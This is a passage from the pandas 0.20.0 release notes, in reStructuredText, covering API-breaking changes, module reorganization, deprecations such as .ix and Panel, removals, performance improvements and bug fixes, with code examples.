(:issue:`15677`)\n\n.. ipython:: python\n\n   np.random.seed(1234)\n   df = pd.DataFrame(np.random.rand(100, 2),\n                     columns=pd.Index(['A', 'B'], name='bar'),\n                     index=pd.date_range('20160101',\n                                         periods=100, freq='D', name='foo'))\n   df.tail()\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [2]: df.rolling(12).corr()\n   Out[2]:\n   <class 'pandas.core.panel.Panel'>\n   Dimensions: 100 (items) x 2 (major_axis) x 2 (minor_axis)\n   Items axis: 2016-01-01 00:00:00 to 2016-04-09 00:00:00\n   Major_axis axis: A to B\n   Minor_axis axis: A to B\n\nNew behavior:\n\n.. ipython:: python\n\n   res = df.rolling(12).corr()\n   res.tail()\n\nRetrieving a correlation matrix for a cross-section\n\n.. ipython:: python\n\n   df.rolling(12).corr().loc['2016-04-07']\n\n.. _whatsnew_0200.api_breaking.hdfstore_where:\n\nHDFStore where string comparison\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn previous versions most types could be compared to string column in a ``HDFStore``\nusually resulting in an invalid comparison, returning an empty result frame. These comparisons will now raise a\n``TypeError`` (:issue:`15492`)\n\n.. ipython:: python\n\n   df = pd.DataFrame({'unparsed_date': ['2014-01-01', '2014-01-01']})\n   df.to_hdf('store.h5', key='key', format='table', data_columns=True)\n   df.dtypes\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [4]: pd.read_hdf('store.h5', 'key', where='unparsed_date > ts')\n   File \"<string>\", line 1\n     (unparsed_date > 1970-01-01 00:00:01.388552400)\n                           ^\n   SyntaxError: invalid token\n\nNew behavior:\n\n.. code-block:: ipython\n\n   In [18]: ts = pd.Timestamp('2014-01-01')\n\n   In [19]: pd.read_hdf('store.h5', 'key', where='unparsed_date > ts')\n   TypeError: Cannot compare 2014-01-01 00:00:00 of\n   type <class 'pandas.tslib.Timestamp'> to string column\n\n.. ipython:: python\n   :suppress:\n\n   import os\n   os.remove('store.h5')\n\n.. _whatsnew_0200.api_breaking.index_order:\n\nIndex.intersection and inner join now preserve the order of the left Index\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`Index.intersection` now preserves the order of the calling ``Index`` (left)\ninstead of the other ``Index`` (right) (:issue:`15582`). This affects inner\njoins, :meth:`DataFrame.join` and :func:`merge`, and the ``.align`` method.\n\n- ``Index.intersection``\n\n  .. ipython:: python\n\n     left = pd.Index([2, 1, 0])\n     left\n     right = pd.Index([1, 2, 3])\n     right\n\n  Previous behavior:\n\n  .. code-block:: ipython\n\n     In [4]: left.intersection(right)\n     Out[4]: Int64Index([1, 2], dtype='int64')\n\n  New behavior:\n\n  .. ipython:: python\n\n     left.intersection(right)\n\n- ``DataFrame.join`` and ``pd.merge``\n\n  .. ipython:: python\n\n     left = pd.DataFrame({'a': [20, 10, 0]}, index=[2, 1, 0])\n     left\n     right = pd.DataFrame({'b': [100, 200, 300]}, index=[1, 2, 3])\n     right\n\n  Previous behavior:\n\n  .. code-block:: ipython\n\n     In [4]: left.join(right, how='inner')\n     Out[4]:\n        a    b\n     1  10  100\n     2  20  200\n\n  New behavior:\n\n  .. ipython:: python\n\n     left.join(right, how='inner')\n\n.. _whatsnew_0200.api_breaking.pivot_table:\n\nPivot table always returns a DataFrame\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe documentation for :meth:`pivot_table` states that a ``DataFrame`` is *always* returned. Here a bug\nis fixed that allowed this to return a ``Series`` under certain circumstance. (:issue:`4386`)\n\n.. ipython:: python\n\n   df = pd.DataFrame({'col1': [3, 4, 5],\n                      'col2': ['C', 'D', 'E'],\n                      'col3': [1, 3, 9]})\n   df\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [2]: df.pivot_table('col1', index=['col3', 'col2'], aggfunc=\"sum\")\n   Out[2]:\n   col3  col2\n   1     C       3\n   3     D       4\n   9     E       5\n   Name: col1, dtype: int64\n\nNew behavior:\n\n.. ipython:: python\n\n   df.pivot_table('col1', index=['col3', 'col2'], aggfunc=\"sum\")\n\n.. _whatsnew_0200.api:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n\n- ``numexpr`` version is now required to be >= 2.4.6 and it will not be used at all if this requisite is not fulfilled (:issue:`15213`).\n- ``CParserError`` has been renamed to ``ParserError`` in ``pd.read_csv()`` and will be removed in the future (:issue:`12665`)\n- ``SparseArray.cumsum()`` and ``SparseSeries.cumsum()`` will now always return ``SparseArray`` and ``SparseSeries`` respectively (:issue:`12855`)\n- ``DataFrame.applymap()`` with an empty ``DataFrame`` will return a copy of the empty ``DataFrame`` instead of a ``Series`` (:issue:`8222`)\n- ``Series.map()`` now respects default values of dictionary subclasses with a ``__missing__`` method, such as ``collections.Counter`` (:issue:`15999`)\n- ``.loc`` has compat with ``.ix`` for accepting iterators, and NamedTuples (:issue:`15120`)\n- ``interpolate()`` and ``fillna()`` will raise a ``ValueError`` if the ``limit`` keyword argument is not greater than 0. (:issue:`9217`)\n- ``pd.read_csv()`` will now issue a ``ParserWarning`` whenever there are conflicting values provided by the ``dialect`` parameter and the user (:issue:`14898`)\n- ``pd.read_csv()`` will now raise a ``ValueError`` for the C engine if the quote character is larger than one byte (:issue:`11592`)\n- ``inplace`` arguments now require a boolean value, else a ``ValueError`` is thrown (:issue:`14189`)\n- ``pandas.api.types.is_datetime64_ns_dtype`` will now report ``True`` on a tz-aware dtype, similar to ``pandas.api.types.is_datetime64_any_dtype``\n- ``DataFrame.asof()`` will return a null filled ``Series`` instead the scalar ``NaN`` if a match is not found (:issue:`15118`)\n- Specific support for ``copy.copy()`` and ``copy.deepcopy()`` functions on NDFrame objects (:issue:`15444`)\n- ``Series.sort_values()`` accepts a one element list of bool for consistency with the behavior of ``DataFrame.sort_values()`` (:issue:`15604`)\n- ``.merge()`` and ``.join()`` on ``category`` dtype columns will now preserve the category dtype when possible (:issue:`10409`)\n- ``SparseDataFrame.default_fill_value`` will be 0, previously was ``nan`` in the return from ``pd.get_dummies(..., sparse=True)`` (:issue:`15594`)\n- The default behaviour of ``Series.str.match`` has changed from extracting\n  groups to matching the pattern. The extracting behaviour was deprecated\n  since pandas version 0.13.0 and can be done with the ``Series.str.extract``\n  method (:issue:`5224`). As a consequence, the ``as_indexer`` keyword is\n  ignored (no longer needed to specify the new behaviour) and is deprecated.\n- ``NaT`` will now correctly report ``False`` for datetimelike boolean operations such as ``is_month_start`` (:issue:`15781`)\n- ``NaT`` will now correctly return ``np.nan`` for ``Timedelta`` and ``Period`` accessors such as ``days`` and ``quarter`` (:issue:`15782`)\n- ``NaT`` will now returns ``NaT`` for ``tz_localize`` and ``tz_convert``\n  methods (:issue:`15830`)\n- ``DataFrame`` and ``Panel`` constructors with invalid input will now raise ``ValueError`` rather than ``PandasError``, if called with scalar inputs and not axes (:issue:`15541`)\n- ``DataFrame`` and ``Panel`` constructors with invalid input will now raise ``ValueError`` rather than ``pandas.core.common.PandasError``, if called with scalar inputs and not axes; The exception ``PandasError`` is removed as well. (:issue:`15541`)\n- The exception ``pandas.core.common.AmbiguousIndexError`` is removed as it is not referenced (:issue:`15541`)\n\n\n.. _whatsnew_0200.privacy:\n\nReorganization of the library: privacy changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew_0200.privacy.extensions:\n\nModules privacy has changed\n^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nSome formerly public python/c/c++/cython extension modules have been moved and/or renamed. These are all removed from the public API.\nFurthermore, the ``pandas.core``, ``pandas.compat``, and ``pandas.util`` top-level modules are now considered to be PRIVATE.\nIf indicated, a deprecation warning will be issued if you reference these modules. (:issue:`12588`)\n\n.. csv-table::\n    :header: \"Previous Location\", \"New Location\", \"Deprecated\"\n    :widths: 30, 30, 4\n\n    \"pandas.lib\", \"pandas._libs.lib\", \"X\"\n    \"pandas.tslib\", \"pandas._libs.tslib\", \"X\"\n    \"pandas.computation\", \"pandas.core.computation\", \"X\"\n    \"pandas.msgpack\", \"pandas.io.msgpack\", \"\"\n    \"pandas.index\", \"pandas._libs.index\", \"\"\n    \"pandas.algos\", \"pandas._libs.algos\", \"\"\n    \"pandas.hashtable\", \"pandas._libs.hashtable\", \"\"\n    \"pandas.indexes\", \"pandas.core.indexes\", \"\"\n    \"pandas.json\", \"pandas._libs.json / pandas.io.json\", \"X\"\n    \"pandas.parser\", \"pandas._libs.parsers\", \"X\"\n    \"pandas.formats\", \"pandas.io.formats\", \"\"\n    \"pandas.sparse\", \"pandas.core.sparse\", \"\"\n    \"pandas.tools\", \"pandas.core.reshape\", \"X\"\n    \"pandas.types\", \"pandas.core.dtypes\", \"X\"\n    \"pandas.io.sas.saslib\", \"pandas.io.sas._sas\", \"\"\n    \"pandas._join\", \"pandas._libs.join\", \"\"\n    \"pandas._hash\", \"pandas._libs.hashing\", \"\"\n    \"pandas._period\", \"pandas._libs.period\", \"\"\n    \"pandas._sparse\", \"pandas._libs.sparse\", \"\"\n    \"pandas._testing\", \"pandas._libs.testing\", \"\"\n    \"pandas._window\", \"pandas._libs.window\", \"\"\n\n\nSome new subpackages are created with public functionality that is not directly\nexposed in the top-level namespace: ``pandas.errors``, ``pandas.plotting`` and\n``pandas.testing`` (more details below). Together with ``pandas.api.types`` and\ncertain functions in the ``pandas.io`` and ``pandas.tseries`` submodules,\nthese are now the public subpackages.\n\nFurther changes:\n\n- The function :func:`~pandas.api.types.union_categoricals` is now importable from ``pandas.api.types``, formerly from ``pandas.types.concat`` (:issue:`15998`)\n- The type import ``pandas.tslib.NaTType`` is deprecated and can be replaced by using ``type(pandas.NaT)`` (:issue:`16146`)\n- The public functions in ``pandas.tools.hashing`` deprecated from that locations, but are now importable from ``pandas.util`` (:issue:`16223`)\n- The modules in ``pandas.util``: ``decorators``, ``print_versions``, ``doctools``, ``validators``, ``depr_module`` are now private. Only the functions exposed in ``pandas.util`` itself are public (:issue:`16223`)\n\n.. _whatsnew_0200.privacy.errors:\n\n``pandas.errors``\n^^^^^^^^^^^^^^^^^\n\nWe are adding a standard public module for all pandas exceptions & warnings ``pandas.errors``. (:issue:`14800`). Previously\nthese exceptions & warnings could be imported from ``pandas.core.common`` or ``pandas.io.common``. These exceptions and warnings\nwill be removed from the ``*.common`` locations in a future release. (:issue:`15541`)\n\nThe following are now part of this API:\n\n.. code-block:: python\n\n   ['DtypeWarning',\n    'EmptyDataError',\n    'OutOfBoundsDatetime',\n    'ParserError',\n    'ParserWarning',\n    'PerformanceWarning',\n    'UnsortedIndexError',\n    'UnsupportedFunctionCall']\n\n\n.. _whatsnew_0200.privacy.testing:\n\n``pandas.testing``\n^^^^^^^^^^^^^^^^^^\n\nWe are adding a standard module that exposes the public testing functions in ``pandas.testing`` (:issue:`9895`). Those functions can be used when writing tests for functionality using pandas objects.\n\nThe following testing functions are now part of this API:\n\n- :func:`testing.assert_frame_equal`\n- :func:`testing.assert_series_equal`\n- :func:`testing.assert_index_equal`\n\n\n.. _whatsnew_0200.privacy.plotting:\n\n``pandas.plotting``\n^^^^^^^^^^^^^^^^^^^\n\nA new public ``pandas.plotting`` module has been added that holds plotting functionality that was previously in either ``pandas.tools.plotting`` or in the top-level namespace. See the :ref:`deprecations sections <whatsnew_0200.privacy.deprecate_plotting>` for more details.\n\n.. _whatsnew_0200.privacy.development:\n\nOther development changes\n^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Building pandas for development now requires ``cython >= 0.23`` (:issue:`14831`)\n- Require at least 0.23 version of cython to avoid problems with character encodings (:issue:`14699`)\n- Switched the test framework to use `pytest <http://doc.pytest.org/en/latest>`__ (:issue:`13097`)\n- Reorganization of tests directory layout (:issue:`14854`, :issue:`15707`).\n\n\n.. _whatsnew_0200.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\n.. _whatsnew_0200.api_breaking.deprecate_ix:\n\nDeprecate ``.ix``\n^^^^^^^^^^^^^^^^^\n\nThe ``.ix`` indexer is deprecated, in favor of the more strict ``.iloc`` and ``.loc`` indexers. ``.ix`` offers a lot of magic on the inference of what the user wants to do. More specifically, ``.ix`` can decide to index *positionally* OR via *labels*, depending on the data type of the index. This has caused quite a bit of user confusion over the years. The full indexing documentation is :ref:`here <indexing>`. (:issue:`14218`)\n\nThe recommended methods of indexing are:\n\n- ``.loc`` if you want to *label* index\n- ``.iloc`` if you want to *positionally* index.\n\nUsing ``.ix`` will now show a ``DeprecationWarning`` with a link to some examples of how to convert code `here <https://pandas.pydata.org/pandas-docs/version/1.0/user_guide/indexing.html#ix-indexer-is-deprecated>`__.\n\n\n.. ipython:: python\n\n   df = pd.DataFrame({'A': [1, 2, 3],\n                      'B': [4, 5, 6]},\n                     index=list('abc'))\n\n   df\n\nPrevious behavior, where you wish to get the 0th and the 2nd elements from the index in the 'A' column.\n\n.. code-block:: ipython\n\n   In [3]: df.ix[[0, 2], 'A']\n   Out[3]:\n   a    1\n   c    3\n   Name: A, dtype: int64\n\nUsing ``.loc``. Here we will select the appropriate indexes from the index, then use *label* indexing.\n\n.. ipython:: python\n\n   df.loc[df.index[[0, 2]], 'A']\n\nUsing ``.iloc``. Here we will get the location of the 'A' column, then use *positional* indexing to select things.\n\n.. ipython:: python\n\n   df.iloc[[0, 2], df.columns.get_loc('A')]\n\n\n.. _whatsnew_0200.api_breaking.deprecate_panel:\n\nDeprecate Panel\n^^^^^^^^^^^^^^^\n\n``Panel`` is deprecated and will be removed in a future version. The recommended way to represent 3-D data are\nwith a ``MultiIndex`` on a ``DataFrame`` via the :meth:`~Panel.to_frame` or with the `xarray package <http://xarray.pydata.org/en/stable/>`__. pandas\nprovides a :meth:`~Panel.to_xarray` method to automate this conversion (:issue:`13563`).\n\n.. code-block:: ipython\n\n    In [133]: import pandas._testing as tm\n\n    In [134]: p = tm.makePanel()\n\n    In [135]: p\n    Out[135]:\n    <class 'pandas.core.panel.Panel'>\n    Dimensions: 3 (items) x 3 (major_axis) x 4 (minor_axis)\n    Items axis: ItemA to ItemC\n    Major_axis axis: 2000-01-03 00:00:00 to 2000-01-05 00:00:00\n    Minor_axis axis: A to D\n\nConvert to a MultiIndex DataFrame\n\n.. code-block:: ipython\n\n    In [136]: p.to_frame()\n    Out[136]:\n                         ItemA     ItemB     ItemC\n    major      minor\n    2000-01-03 A      0.628776 -1.409432  0.209395\n               B      0.988138 -1.347533 -0.896581\n               C     -0.938153  1.272395 -0.161137\n               D     -0.223019 -0.591863 -1.051539\n    2000-01-04 A      0.186494  1.422986 -0.592886\n               B     -0.072608  0.363565  1.104352\n               C     -1.239072 -1.449567  0.889157\n               D      2.123692 -0.414505 -0.319561\n    2000-01-05 A      0.952478 -2.147855 -1.473116\n               B     -0.550603 -0.014752 -0.431550\n               C      0.139683 -1.195524  0.288377\n               D      0.122273 -1.425795 -0.619993\n\n    [12 rows x 3 columns]\n\nConvert to an xarray DataArray\n\n.. code-block:: ipython\n\n    In [137]: p.to_xarray()\n    Out[137]:\n    <xarray.DataArray (items: 3, major_axis: 3, minor_axis: 4)>\n    array([[[ 0.628776,  0.988138, -0.938153, -0.223019],\n            [ 0.186494, -0.072608, -1.239072,  2.123692],\n            [ 0.952478, -0.550603,  0.139683,  0.122273]],\n\n           [[-1.409432, -1.347533,  1.272395, -0.591863],\n            [ 1.422986,  0.363565, -1.449567, -0.414505],\n            [-2.147855, -0.014752, -1.195524, -1.425795]],\n\n           [[ 0.209395, -0.896581, -0.161137, -1.051539],\n            [-0.592886,  1.104352,  0.889157, -0.319561],\n            [-1.473116, -0.43155 ,  0.288377, -0.619993]]])\n    Coordinates:\n      * items       (items) object 'ItemA' 'ItemB' 'ItemC'\n      * major_axis  (major_axis) datetime64[ns] 2000-01-03 2000-01-04 2000-01-05\n      * minor_axis  (minor_axis) object 'A' 'B' 'C' 'D'\n\n.. _whatsnew_0200.api_breaking.deprecate_group_agg_dict:\n\nDeprecate groupby.agg() with a dictionary when renaming\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe ``.groupby(..).agg(..)``, ``.rolling(..).agg(..)``, and ``.resample(..).agg(..)``  syntax can accept a variable of inputs, including scalars,\nlist, and a dict of column names to scalars or lists. This provides a useful syntax for constructing multiple\n(potentially different) aggregations.\n\nHowever, ``.agg(..)`` can *also* accept a dict that allows 'renaming' of the result columns. This is a complicated and confusing syntax, as well as not consistent\nbetween ``Series`` and ``DataFrame``. We are deprecating this 'renaming' functionality.\n\n- We are deprecating passing a dict to a grouped/rolled/resampled ``Series``. This allowed\n  one to ``rename`` the resulting aggregation, but this had a completely different\n  meaning than passing a dictionary to a grouped ``DataFrame``, which accepts column-to-aggregations.\n- We are deprecating passing a dict-of-dicts to a grouped/rolled/resampled ``DataFrame`` in a similar manner.\n\nThis is an illustrative example:\n\n.. ipython:: python\n\n   df = pd.DataFrame({'A': [1, 1, 1, 2, 2],\n                      'B': range(5),\n                      'C': range(5)})\n   df\n\nHere is a typical useful syntax for computing different aggregations for different columns. This\nis a natural, and useful syntax. We aggregate from the dict-to-list by taking the specified\ncolumns and applying the list of functions. This returns a ``MultiIndex`` for the columns (this is *not* deprecated).\n\n.. ipython:: python\n\n   df.groupby('A').agg({'B': 'sum', 'C': 'min'})\n\nHere's an example of the first deprecation, passing a dict to a grouped ``Series``. This\nis a combination aggregation & renaming:\n\n.. code-block:: ipython\n\n   In [6]: df.groupby('A').B.agg({'foo': 'count'})\n   FutureWarning: using a dict on a Series for aggregation\n   is deprecated and will be removed in a future version\n\n   Out[6]:\n      foo\n   A\n   1    3\n   2    2\n\nYou can accomplish the same operation, more idiomatically by:\n\n.. ipython:: python\n\n   df.groupby('A').B.agg(['count']).rename(columns={'count': 'foo'})\n\n\nHere's an example of the second deprecation, passing a dict-of-dict to a grouped ``DataFrame``:\n\n.. code-block:: python\n\n   In [23]: (df.groupby('A')\n       ...:    .agg({'B': {'foo': 'sum'}, 'C': {'bar': 'min'}})\n       ...:  )\n   FutureWarning: using a dict with renaming is deprecated and\n   will be removed in a future version\n\n   Out[23]:\n        B   C\n      foo bar\n   A\n   1   3   0\n   2   7   3\n\n\nYou can accomplish nearly the same by:\n\n.. ipython:: python\n\n   (df.groupby('A')\n      .agg({'B': 'sum', 'C': 'min'})\n      .rename(columns={'B': 'foo', 'C': 'bar'})\n    )\n\n\n\n.. _whatsnew_0200.privacy.deprecate_plotting:\n\nDeprecate .plotting\n^^^^^^^^^^^^^^^^^^^\n\nThe ``pandas.tools.plotting`` module has been deprecated,  in favor of the top level ``pandas.plotting`` module. All the public plotting functions are now available\nfrom ``pandas.plotting`` (:issue:`12548`).\n\nFurthermore, the top-level ``pandas.scatter_matrix`` and ``pandas.plot_params`` are deprecated.\nUsers can import these from ``pandas.plotting`` as well.\n\nPrevious script:\n\n.. code-block:: python\n\n   pd.tools.plotting.scatter_matrix(df)\n   pd.scatter_matrix(df)\n\nShould be changed to:\n\n.. code-block:: python\n\n   pd.plotting.scatter_matrix(df)\n\n\n\n.. _whatsnew_0200.deprecations.other:\n\nOther deprecations\n^^^^^^^^^^^^^^^^^^\n\n- ``SparseArray.to_dense()`` has deprecated the ``fill`` parameter, as that parameter was not being respected (:issue:`14647`)\n- ``SparseSeries.to_dense()`` has deprecated the ``sparse_only`` parameter (:issue:`14647`)\n- ``Series.repeat()`` has deprecated the ``reps`` parameter in favor of ``repeats`` (:issue:`12662`)\n- The ``Series`` constructor and ``.astype`` method have deprecated accepting timestamp dtypes without a frequency (e.g. ``np.datetime64``) for the ``dtype`` parameter (:issue:`15524`)\n- ``Index.repeat()`` and ``MultiIndex.repeat()`` have deprecated the ``n`` parameter in favor of ``repeats`` (:issue:`12662`)\n- ``Categorical.searchsorted()`` and ``Series.searchsorted()`` have deprecated the ``v`` parameter in favor of ``value`` (:issue:`12662`)\n- ``TimedeltaIndex.searchsorted()``, ``DatetimeIndex.searchsorted()``, and ``PeriodIndex.searchsorted()`` have deprecated the ``key`` parameter in favor of ``value`` (:issue:`12662`)\n- ``DataFrame.astype()`` has deprecated the ``raise_on_error`` parameter in favor of ``errors`` (:issue:`14878`)\n- ``Series.sortlevel`` and ``DataFrame.sortlevel`` have been deprecated in favor of ``Series.sort_index`` and ``DataFrame.sort_index`` (:issue:`15099`)\n- importing ``concat`` from ``pandas.tools.merge`` has been deprecated in favor of imports from the ``pandas`` namespace. This should only affect explicit imports (:issue:`15358`)\n- ``Series/DataFrame/Panel.consolidate()`` been deprecated as a public method. (:issue:`15483`)\n- The ``as_indexer`` keyword of ``Series.str.match()`` has been deprecated (ignored keyword) (:issue:`15257`).\n- The following top-level pandas functions have been deprecated and will be removed in a future version (:issue:`13790`, :issue:`15940`)\n\n  * ``pd.pnow()``, replaced by ``Period.now()``\n  * ``pd.Term``, is removed, as it is not applicable to user code. Instead use in-line string expressions in the where clause when searching in HDFStore\n  * ``pd.Expr``, is removed, as it is not applicable to user code.\n  * ``pd.match()``, is removed.\n  * ``pd.groupby()``, replaced by using the ``.groupby()`` method directly on a ``Series/DataFrame``\n  * ``pd.get_store()``, replaced by a direct call to ``pd.HDFStore(...)``\n- ``is_any_int_dtype``, ``is_floating_dtype``, and ``is_sequence`` are deprecated from ``pandas.api.types`` (:issue:`16042`)\n\n.. _whatsnew_0200.prior_deprecations:\n\nRemoval of prior version deprecations/changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n- The ``pandas.rpy`` module is removed. Similar functionality can be accessed\n  through the `rpy2 <https://rpy2.readthedocs.io/>`__ project.\n  See the `R interfacing docs <https://pandas.pydata.org/pandas-docs/version/0.20/r_interface.html>`__ for more details.\n- The ``pandas.io.ga`` module with a ``google-analytics`` interface is removed (:issue:`11308`).\n  Similar functionality can be found in the `Google2Pandas <https://github.com/panalysis/Google2Pandas>`__ package.\n- ``pd.to_datetime`` and ``pd.to_timedelta`` have dropped the ``coerce`` parameter in favor of ``errors`` (:issue:`13602`)\n- ``pandas.stats.fama_macbeth``, ``pandas.stats.ols``, ``pandas.stats.plm`` and ``pandas.stats.var``, as well as the top-level ``pandas.fama_macbeth`` and ``pandas.ols`` routines are removed. Similar functionality can be found in the `statsmodels <https://www.statsmodels.org/dev/>`__ package. (:issue:`11898`)\n- The ``TimeSeries`` and ``SparseTimeSeries`` classes, aliases of ``Series``\n  and ``SparseSeries``, are removed (:issue:`10890`, :issue:`15098`).\n- ``Series.is_time_series`` is dropped in favor of ``Series.index.is_all_dates`` (:issue:`15098`)\n- The deprecated ``irow``, ``icol``, ``iget`` and ``iget_value`` methods are removed\n  in favor of ``iloc`` and ``iat`` as explained :ref:`here <whatsnew_0170.deprecations>` (:issue:`10711`).\n- The deprecated ``DataFrame.iterkv()`` has been removed in favor of ``DataFrame.iteritems()`` (:issue:`10711`)\n- The ``Categorical`` constructor has dropped the ``name`` parameter (:issue:`10632`)\n- ``Categorical`` has dropped support for ``NaN`` categories (:issue:`10748`)\n- The ``take_last`` parameter has been dropped from ``duplicated()``, ``drop_duplicates()``, ``nlargest()``, and ``nsmallest()`` methods (:issue:`10236`, :issue:`10792`, :issue:`10920`)\n- ``Series``, ``Index``, and ``DataFrame`` have dropped the ``sort`` and ``order`` methods (:issue:`10726`)\n- Where clauses in ``pytables`` are only accepted as strings and expressions types and not other data-types (:issue:`12027`)\n- ``DataFrame`` has dropped the ``combineAdd`` and ``combineMult`` methods in favor of ``add`` and ``mul`` respectively (:issue:`10735`)\n\n.. _whatsnew_0200.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Improved performance of ``pd.wide_to_long()`` (:issue:`14779`)\n- Improved performance of ``pd.factorize()`` by releasing the GIL with ``object`` dtype when inferred as strings (:issue:`14859`, :issue:`16057`)\n- Improved performance of timeseries plotting with an irregular DatetimeIndex\n  (or with ``compat_x=True``) (:issue:`15073`).\n- Improved performance of ``groupby().cummin()`` and ``groupby().cummax()`` (:issue:`15048`, :issue:`15109`, :issue:`15561`, :issue:`15635`)\n- Improved performance and reduced memory when indexing with a ``MultiIndex`` (:issue:`15245`)\n- When reading buffer object in ``read_sas()`` method without specified format, filepath string is inferred rather than buffer object. (:issue:`14947`)\n- Improved performance of ``.rank()`` for categorical data (:issue:`15498`)\n- Improved performance when using ``.unstack()`` (:issue:`15503`)\n- Improved performance of merge/join on ``category`` columns (:issue:`10409`)\n- Improved performance of ``drop_duplicates()`` on ``bool`` columns (:issue:`12963`)\n- Improve performance of ``pd.core.groupby.GroupBy.apply`` when the applied\n  function used the ``.name`` attribute of the group DataFrame (:issue:`15062`).\n- Improved performance of ``iloc`` indexing with a list or array (:issue:`15504`).\n- Improved performance of ``Series.sort_index()`` with a monotonic index (:issue:`15694`)\n- Improved performance in ``pd.read_csv()`` on some platforms with buffered reads (:issue:`16039`)\n\n.. _whatsnew_0200.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nConversion\n^^^^^^^^^^\n\n- Bug in ``Timestamp.replace`` now raises ``TypeError`` when incorrect argument names are given; previously this raised ``ValueError`` (:issue:`15240`)\n- Bug in ``Timestamp.replace`` with compat for passing long integers (:issue:`15030`)\n- Bug in ``Timestamp`` returning UTC based time/date attributes when a timezone was provided (:issue:`13303`, :issue:`6538`)\n- Bug in ``Timestamp`` incorrectly localizing timezones during construction (:issue:`11481`, :issue:`15777`)\n- Bug in ``TimedeltaIndex`` addition where overflow was being allowed without error (:issue:`14816`)\n- Bug in ``TimedeltaIndex`` raising a ``ValueError`` when boolean indexing with ``loc`` (:issue:`14946`)\n- Bug in catching an overflow in ``Timestamp`` + ``Timedelta/Offset`` operations (:issue:`15126`)\n- Bug in ``DatetimeIndex.round()`` and ``Timestamp.round()`` floating point accuracy when rounding by milliseconds or less (:issue:`14440`, :issue:`15578`)\n- Bug in ``astype()`` where ``inf`` values were incorrectly converted to integers. Now raises error now with ``astype()`` for Series and DataFrames (:issue:`14265`)\n- Bug in ``DataFrame(..).apply(to_numeric)`` when values are of type decimal.Decimal. (:issue:`14827`)\n- Bug in ``describe()`` when passing a numpy array which does not contain the median to the ``percentiles`` keyword argument (:issue:`14908`)\n- Cleaned up ``PeriodIndex`` constructor, including raising on floats more consistently (:issue:`13277`)\n- Bug in using ``__deepcopy__`` on empty NDFrame objects (:issue:`15370`)\n- Bug in ``.replace()`` may result in incorrect dtypes. (:issue:`12747`, :issue:`15765`)\n- Bug in ``Series.replace`` and ``DataFrame.replace`` which failed on empty replacement dicts (:issue:`15289`)\n- Bug in ``Series.replace`` which replaced a numeric by string (:issue:`15743`)\n- Bug in ``Index`` construction with ``NaN`` elements and integer dtype specified (:issue:`15187`)\n- Bug in ``Series`` construction with a datetimetz (:issue:`14928`)\n- Bug in ``Series.dt.round()`` inconsistent behaviour on ``NaT`` 's with different arguments (:issue:`14940`)\n- Bug in ``Series`` constructor when both ``copy=True`` and ``dtype`` arguments are provided (:issue:`15125`)\n- Incorrect dtyped ``Series`` was returned by comparison methods (e.g., ``lt``, ``gt``, ...) against a constant for an empty ``DataFrame`` (:issue:`15077`)\n- Bug in ``Series.ffill()`` with mixed dtypes containing tz-aware datetimes. (:issue:`14956`)\n- Bug in ``DataFrame.fillna()`` where the argument ``downcast`` was ignored when fillna value was of type ``dict`` (:issue:`15277`)\n- Bug in ``.asfreq()``, where frequency was not set for empty ``Series`` (:issue:`14320`)\n- Bug in ``DataFrame`` construction with nulls and datetimes in a list-like (:issue:`15869`)\n- Bug in ``DataFrame.fillna()`` with tz-aware datetimes (:issue:`15855`)\n- Bug in ``is_string_dtype``, ``is_timedelta64_ns_dtype``, and ``is_string_like_dtype`` in which an error was raised when ``None`` was passed in (:issue:`15941`)\n- Bug in the return type of ``pd.unique`` on a ``Categorical``, which was returning an ndarray and not a ``Categorical`` (:issue:`15903`)\n- Bug in ``Index.to_series()`` where the index was not copied (and so mutating later would change the original), (:issue:`15949`)\n- Bug in indexing with partial string indexing with a len-1 DataFrame (:issue:`16071`)\n- Bug in ``Series`` construction where passing invalid dtype didn't raise an error. (:issue:`15520`)\n\nIndexing\n^^^^^^^^\n\n- Bug in ``Index`` power operations with reversed operands (:issue:`14973`)\n- Bug in ``DataFrame.sort_values()`` when sorting by multiple columns where one column is of type ``int64`` and contains ``NaT`` (:issue:`14922`)\n- Bug in ``DataFrame.reindex()`` in which ``method`` was ignored when passing ``columns`` (:issue:`14992`)\n- Bug in ``DataFrame.loc`` with indexing a ``MultiIndex`` with a ``Series`` indexer (:issue:`14730`, :issue:`15424`)\n- Bug in ``DataFrame.loc`` with indexing a ``MultiIndex`` with a numpy array (:issue:`15434`)\n- Bug in ``Series.asof`` which raised if the series contained all ``np.nan`` (:issue:`15713`)\n- Bug in ``.at`` when selecting from a tz-aware column (:issue:`15822`)\n- Bug in ``Series.where()`` and ``DataFrame.where()`` where array-like conditionals were being rejected (:issue:`15414`)\n- Bug in ``Series.where()`` where TZ-aware data was converted to float representation (:issue:`15701`)\n- Bug in ``.loc`` that would not return the correct dtype for scalar access for a DataFrame (:issue:`11617`)\n- Bug in output formatting of a ``MultiIndex`` when names are integers (:issue:`12223`, :issue:`15262`)\n- Bug in ``Categorical.searchsorted()`` where alphabetical instead of the provided categorical order was used (:issue:`14522`)\n- Bug in ``Series.iloc`` where a ``Categorical`` object for list-like indexes input was returned, where a ``Series`` was expected. (:issue:`14580`)\n- Bug in ``DataFrame.isin`` comparing datetimelike to empty frame (:issue:`15473`)\n- Bug in ``.reset_index()`` when an all ``NaN`` level of a ``MultiIndex`` would fail (:issue:`6322`)\n- Bug in ``.reset_index()`` when raising error for index name already present in ``MultiIndex`` columns 